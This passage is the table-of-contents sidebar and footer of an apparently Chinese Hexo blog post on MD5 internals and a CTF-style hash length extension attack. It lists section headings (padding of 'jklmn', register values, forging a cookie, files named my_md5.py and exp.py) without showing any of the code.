class="nav-text">MD5(“8a683566bcc7801226b3d8b0cf35fd97”) =cf2cb5c89c5e5eeebef4a76becddfcfd</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MD5加密字符串实例"><span class="nav-number">1.2.2.40.</span> <span class="nav-text">MD5加密字符串实例</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#现以字符串jklmn为例。"><span class="nav-number">1.2.2.41.</span> <span class="nav-text">现以字符串jklmn为例。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#该字符串在内存中表示为：6A-6B-6C-6D-6E-从左到右为低地址到高地址，后同-，信息长度为40-bits，即0x28。"><span class="nav-number">1.2.2.42.</span> <span class="nav-text">该字符串在内存中表示为：6A 6B 6C 6D 6E(从左到右为低地址到高地址，后同)，信息长度为40 bits，即0x28。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#对其填充，填充至448位，即56字节。结果为："><span class="nav-number">1.2.2.43.</span> <span class="nav-text">对其填充，填充至448位，即56字节。结果为：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#剩下64位，即8字节填充填充前的信息拉长，按小段字节序填充剩下的8字节，结果为。"><span class="nav-number">1.2.2.44.</span> <span class="nav-text">剩下64位，即8字节填充填充前的信息拉长，按小段字节序填充剩下的8字节，结果为。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#64字节，512-bits"><span class="nav-number">1.2.2.45.</span> <span class="nav-text">(64字节，512 bits)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#初始化A，B，C，D四个变量。"><span class="nav-number">1.2.2.46.</span> <span class="nav-text">初始化A，B，C，D四个变量。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#将这64字节填充后数据分成16个小组-程序中对应为16个数组-，即："><span class="nav-number">1.2.2.47.</span> <span class="nav-text">将这64字节填充后数据分成16个小组(程序中对应为16个数组)，即：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#M0-6A-6B-6C-6D-这是内存中的顺序，按照小端字节序原则，对应数组M-0-的值为0x6D6C6B6A，下同"><span class="nav-number">1.2.2.48.</span> <span class="nav-text">M0:6A 6B 6C 6D(这是内存中的顺序，按照小端字节序原则，对应数组M(0)的值为0x6D6C6B6A，下同)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#M1-6E-80-00-00"><span class="nav-number">1.2.2.49.</span> <span class="nav-text">M1:6E 80 00 00</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#M2-00-00-00-00"><span class="nav-number">1.2.2.50.</span> <span class="nav-text">M2:00 00 00 00</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#……"><span class="nav-number">1.2.2.51.</span> <span class="nav-text">……</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#M14-28-00-00-00"><span class="nav-number">1.2.2.52.</span> <span class="nav-text">M14:28 00 00 00</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#M15-00-00-00-00"><span class="nav-number">1.2.2.53.</span> <span class="nav-text">M15:00 00 00 00</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#经过3-分组数据处理后，a-b-c-d值分别为0xD8523F60-0x837E0144-0x517726CA-0x1BB6E5FE"><span class="nav-number">1.2.2.54.</span> <span class="nav-text">经过3.分组数据处理后，a,b,c,d值分别为0xD8523F60,0x837E0144,0x517726CA,0x1BB6E5FE</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在内存中为："><span class="nav-number">1.2.2.55.</span> <span class="nav-text">在内存中为：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#a-60-3F-52-D8"><span class="nav-number">1.2.2.56.</span> <span class="nav-text">a: 60 3F 52 D8</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#b：44-01-7E-83"><span class="nav-number">1.2.2.57.</span> <span class="nav-text">b：44 01 7E 83</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#c：CA-26-77-51"><span class="nav-number">1.2.2.58.</span> <span class="nav-text">c：CA 26 77 51</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#d：FE-E5-B6-1B"><span class="nav-number">1.2.2.59.</span> <span class="nav-text">d：FE E5 B6 1B</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#a-b-c-d按内存顺序输出即为最终结果：603F52D844017E83CA267751FEE5B61B。就是字符串jklmn的md5值。"><span class="nav-number">1.2.2.60.</span> <span class="nav-text">a,b,c,d按内存顺序输出即为最终结果：603F52D844017E83CA267751FEE5B61B。就是字符串jklmn的md5值。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x003-代码实现MD5转换器"><span class="nav-number">1.2.3.</span> <span class="nav-text">0x003 代码实现MD5转换器</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#java实现MD5："><span class="nav-number">1.2.3.1.</span> <span class="nav-text">java实现MD5：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x004-哈希长度扩展攻击"><span class="nav-number">1.2.4.</span> <span class="nav-text">0x004 哈希长度扩展攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#下面结合一个例子来描述其过程："><span class="nav-number">1.2.4.1.</span> <span class="nav-text">下面结合一个例子来描述其过程：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这个核心的判断在第二个if判断"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">这个核心的判断在第二个if判断</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#flag获取的要求是：传进一个cookie使getmein等于md5-secret-urldecode-username-password-且后面部分不能为adminadmin，也就是说需要构造getmein的cookie和他那串字符串相同就可以了。"><span class="nav-number">1.2.4.3.</span> <span class="nav-text">flag获取的要求是：传进一个cookie使getmein等于md5($secret.urldecode($username.$password))且后面部分不能为adminadmin，也就是说需要构造getmein的cookie和他那串字符串相同就可以了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们已知-secret长度为15，先进行消息的填充，前面的A随便写的，为了占15个字符，填充如下："><span class="nav-number">1.2.4.4.</span> <span class="nav-text">我们已知$secret长度为15，先进行消息的填充，前面的A随便写的，为了占15个字符，填充如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#my-md5-py"><span class="nav-number">1.2.4.5.</span> <span class="nav-text">my_md5.py</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#exp-py"><span class="nav-number">1.2.4.6.</span> <span class="nav-text">exp.py</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考链接"><span class="nav-number">1.2.5.</span> <span class="nav-text">参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-xz-aliyun-com-t-2563"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">https://xz.aliyun.com/t/2563</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-blog-csdn-net-syh-486-007-article-details-51228628"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">https://blog.csdn.net/syh_486_007/article/details/51228628</span></a></li></ol></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ljdd520</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">178k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
